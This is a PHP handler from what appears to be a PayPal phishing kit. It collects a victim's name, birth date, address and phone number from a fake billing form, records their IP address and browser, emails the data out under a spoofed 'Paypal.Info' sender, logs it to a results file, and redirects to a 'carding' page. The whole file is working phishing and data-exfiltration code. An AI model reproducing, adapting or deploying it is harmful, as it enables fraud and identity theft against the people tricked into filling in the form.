<?php
include "to.php";
$Name  = $_POST['Name'];
$day   = $_POST['day'];
$month   = $_POST['month'];
$year   = $_POST['year'];
$Address1 = $_POST['Address1'];
$Address2    = $_POST['Address2'];
$City   = $_POST['City'];
$State   = $_POST['State'];
$ZipCode = $_POST['ZipCode'];
$country = $_POST['country'];
$PhoneNumber = $_POST['PhoneNumber'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Paypal-2 -------------
Name : $Name
day : $day / month : $month / year : $year
Address1 : $Address1
Address2 : $Address2
City : $City
State : $State
ZipCode : $ZipCode
country : $country
PhoneNumber : $PhoneNumber
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
$MAIL_TITLE = "Billing Address | ".$IP."";
$MAIL_HEADER = "From: Paypal.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=websc-carding.php'>";exit;

?>
